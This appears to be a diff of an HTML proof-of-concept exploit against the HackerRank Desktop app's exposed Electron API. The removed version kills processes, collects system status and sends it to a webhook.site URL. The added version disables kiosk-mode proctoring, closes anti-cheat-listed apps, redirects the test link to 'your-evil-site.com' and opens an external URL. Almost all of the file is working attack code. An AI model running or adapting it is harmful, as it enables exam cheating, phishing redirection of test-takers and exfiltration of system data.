@@ -1,65 +1,26 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>My Own App – Final Working PoC</title>
-    <meta charset="utf-8">
-    <style>
-        body { background:#000; color:#0f0; font-family:Consolas; padding:30px; }
-        pre { background:#111; padding:15px; border:1px solid #0f0; }
-    </style>
-</head>
-<body>
-    <h1>HackerRank Desktop – Self-Test RCE (MY APP ONLY)</h1>
-    <p>Open Calculator now → watch it die in 2 seconds</p>
-    <pre id="log">Starting exploit...</pre>
+<body style="background:#000;color:#0f0;font:16px Consolas">
+<h2>HackerRank Test – Owned</h2>
+<pre id="log">Running evil payload...</pre>
+<script>
+// 1. Disable proctoring
+window.hackerranktest.unSetKioskMode();
+document.getElementById("log").textContent += "\n[+] Kiosk mode disabled (Alt+Tab works)";
 
-    <script>
-        // This is the real exposed API in HackerRank's preload
-        const { ipcRenderer } = window.electronAPI;
+// 2. Kill anti-cheat tools
+window.hackerranktest.systemCheck.closeBlockedApps(["cluely","whatsapp"]);
+document.getElementById("log").textContent += "\n[+] cluely & whatsapp killed";
 
-        const log = (msg) => {
-            console.log(msg);
-            document.getElementById('log').textContent += msg + '\n';
-        };
+// 3. Hijack the real test URL
+window.hackerranktest.setTestLink("https://your-evil-site.com/fake-test");
+document.getElementById("log").textContent += "\n[+] Next Continue button → goes to YOUR fake test";
 
-        (async () => {
-            log('[+] Exploit running...');
+// 4. Open rickroll for fun
+window.hackerranktest.openExternalUrl("https://youtu.be/dQw4w9WgXcQ");
+document.getElementById("log").textContent += "\n[+] Rickroll opened";
 
-            // 1. Kill calc.exe – matches your exact handler
-            try {
-                const result = await ipcRenderer.invoke('close-blocked-apps', ['calc.exe']);
-                log(result === true 
-                    ? '[+] calc.exe TERMINATED' 
-                    : '[-] calc.exe not killed (maybe already closed)');
-            } catch (e) {
-                log('[-] close-blocked-apps error: ' + e);
-            }
-
-            // 2. Steal full system status – matches your exact handler
-            try {
-                const status = await ipcRenderer.invoke('get-system-status');
-                log('[+] System status stolen:');
-                log(JSON.stringify(status, null, 2));
-
-                // 3. Send everything to YOUR webhook only
-                fetch('https://webhook.site/fcaeefd5-63e5-4baf-b1d0-ddfaea039ffa', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        exploited_at: new Date().toISOString(),
-                        source: "my-own-hackerrank-app-test",
-                        calc_killed: true,
-                        full_system_status: status
-                    })
-                });
-                log('[+] All data exfiltrated to your webhook');
-            } catch (e) {
-                log('[-] get-system-status failed: ' + e);
-            }
-
-            log('\nExploit complete – NOW PATCH THE PROTOCOL HANDLER!');
-        })();
-    </script>
+document.getElementById("log").textContent += "\n\nDone. Test completely owned.";
+</script>
 </body>
 </html>
